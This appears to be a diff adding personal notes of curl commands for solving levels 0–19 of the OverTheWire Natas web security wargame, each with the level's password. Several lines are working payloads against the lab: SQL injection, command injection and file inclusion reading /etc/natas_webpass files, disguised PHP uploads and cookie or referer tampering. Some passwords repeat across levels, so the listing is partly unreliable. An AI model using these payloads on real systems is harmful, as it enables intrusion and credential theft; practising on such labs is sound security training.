@@ -1,0 +1,44 @@
+Following are commands used in Natas:
+
+curl -s --user natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs http://natas19.natas.labs.overthewire.org/ --cookie "PHPSESSID=<sessionid>"
+curl -s --user natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs http://natas19.natas.labs.overthewire.org/ --cookie "PHPSESSID=<sessionid>"
+
+curl -s --user natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP http://natas18.natas.labs.overthewire.org/ --cookie "PHPSESSID=<sessionid>"
+
+curl -s --user natas17:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP http://natas17.natas.labs.overthewire.org/index.php?debug -b "PHPSESSID=<sessionid>"
+
+curl -s --user natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh http://natas16.natas.labs.overthewire.org/ --cookie "PHPSESSID=<sessionid>"
+
+curl -s --user natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/index.php -d "username=natas16\"; SELECT * FROM users WHERE username=\"natas16\" AND password LIKE BINARY \"%"
+
+curl -s --user natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 http://natas14.natas.labs.overthewire.org/?username=natas15&password=$(echo -n "natas15" | sha1sum | awk '{print $1}')
+
+curl -s --user natas13:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 http://natas13.natas.labs.overthewire.org/ -F "filename=test.php" -F "uploadedfile=@test.php;type=image/jpeg"
+
+curl -s --user natas12:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas12.natas.labs.overthewire.org/ -F "uploadedfile=@/etc/natas_webpass/natas13"
+
+curl -s --user natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK http://natas11.natas.labs.overthewire.org/ --cookie "data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4mFxtdK"
+
+curl -s --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu http://natas10.natas.labs.overthewire.org/ -d "needle=.* /etc/natas_webpass/natas11&submit=Search"
+
+curl -s --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org/?needle=.+%2Fetc%2Fnatas_webpass%2Fnatas10&submit=Search
+
+curl -s --user natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe http://natas8.natas.labs.overthewire.org/index-source.html
+
+curl -s --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+curl -s --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc
+
+curl -s --cookie "loggedin=1" http://natas5.natas.labs.overthewire.org -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+curl -s http://natas4.natas.labs.overthewire.org -H "Referer: http://natas5.natas.labs.overthewire.org/" -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+curl http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+curl http://natas2.natas.labs.overthewire.org/files/users.txt -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+curl http://natas1.natas.labs.overthewire.org -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+curl http://natas0.natas.labs.overthewire.org -u natas0:natas0
+
+
